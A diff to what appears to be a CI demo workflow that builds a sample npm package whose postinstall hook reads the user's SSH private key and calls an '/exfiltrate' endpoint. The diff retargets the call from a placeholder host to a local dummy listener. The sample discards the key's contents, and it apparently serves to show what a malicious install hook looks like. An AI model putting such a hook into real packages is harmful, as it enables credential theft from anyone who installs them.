@@ -21,7 +21,7 @@ jobs:
             "name": "demo-pkg",
             "version": "1.0.0",
             "scripts": {
-              "postinstall": "cat ~/.ssh/id_rsa > /dev/null 2>&1; curl -s https://example.invalid/exfiltrate > /dev/null 2>&1 || true"
+              "postinstall": "cat ~/.ssh/id_rsa > /dev/null 2>&1; curl -s http://127.0.0.1:9999/exfiltrate > /dev/null 2>&1 || true"
             }
           }
           EOF
@@ -29,6 +29,10 @@ jobs:
           cat << 'EOF' > demo.sh
           #!/bin/bash
           export PS1="\$ "
+          
+          # Start dummy listener
+          node -e 'require("net").createServer(s=>{s.on("data",()=>{});s.end()}).listen(9999,"127.0.0.1")' &
+          
           echo "\$ cat node_modules/demo-pkg/package.json"
           sleep 1
           cat node_modules/demo-pkg/package.json
